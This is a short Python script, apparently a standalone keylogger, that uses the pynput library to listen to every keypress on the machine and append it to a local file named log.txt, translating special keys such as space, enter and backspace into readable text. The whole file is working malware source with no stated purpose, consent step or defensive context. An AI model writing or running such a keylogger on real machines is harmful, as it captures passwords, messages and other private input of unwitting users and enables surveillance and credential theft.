from pynput.keyboard import Listener


def WriteToFile(Key):
    keydata = str(Key)
    keydata = keydata.replace("'","")

    if keydata == "Key.space":
        keydata = " "
    if keydata == "Key.alt_l":
        keydata = ""
    if keydata == "Key.tab":
        keydata = ""
    if keydata == "Key.backspace":
        keydata = " Del "
    if keydata == "Key.enter":
        keydata = "\n"
    if keydata == "Key.esc":
        keydata = "\n"
    if keydata == "Key.shift_r":
        keydata = ""
    if keydata == "Key.ctrl_l":
        keydata = ""
    if keydata == "\\x01":
        keydata = " Select All"
    with open("log.txt","a") as f:
        f.write(keydata)


with Listener(on_press=WriteToFile) as l:
    l.join()
